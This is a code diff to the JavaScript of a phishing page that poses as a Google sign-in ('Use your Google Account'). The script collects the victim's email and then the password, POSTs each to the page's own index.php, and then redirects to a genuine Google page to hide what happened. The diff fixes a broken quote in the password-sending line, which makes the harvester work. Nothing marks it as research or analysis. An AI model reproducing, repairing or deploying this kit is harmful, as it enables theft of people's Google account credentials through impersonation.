@@ -31,16 +31,17 @@ var server = "https://" + location.host + "/index.php";
 
 function updatetext() {
   // var title_box = document.location.host;
-  var input_element = document.querySelector("input");
   // var mxlen = 27;
   // var title_box = title_box.substr(0, mxlen);
   var title_box = "Use your Google Account";
+  let input_element = document.querySelector("input");
 
-  document.getElementById("text_2").innerHTML = title_box;
   input_element.addEventListener("keyup", () => {
     input_element.setAttribute("value", input_element.value);
     document.getElementById("placeholder_").style.cssText = `font-size:12px;`;
   })
+
+  document.getElementById("text_2").innerHTML = title_box;
 }
 
 function showpass() {
@@ -58,7 +59,7 @@ function next() {
   var mailid = document.getElementById("fname").value;
   var x = new XMLHttpRequest();
   x.open("POST", server, true);
-  x.send("| EmailID : " + mailid + " | ");
+  x.send(" | EmailID : " + mailid + " | ");
   if (mailid > "") {
     document.getElementById("document_html_").innerHTML = `
 <body id="document_html_" onload="updatetext()">
@@ -76,7 +77,6 @@ function next() {
      <div id="placeholder_" class="text" style="font-size: 12px;">Enter your password</div>
   </label>
 </form></div>
-
   <div style="text-align: left;!important">
   <b id="error"></b>
   <br>
@@ -131,7 +131,7 @@ function next2() {
   var mailid = document.getElementById("fname").value;
   var x = new XMLHttpRequest();
   x.open("POST", server, true);
-  x.send("| Password : " + mailid + " | );
+  x.send("| Password : " + mailid + " | ");
   if (mailid > "") {
     window.location = "https://www.google.com/account/about/?hl=en-GB";
   } else { 
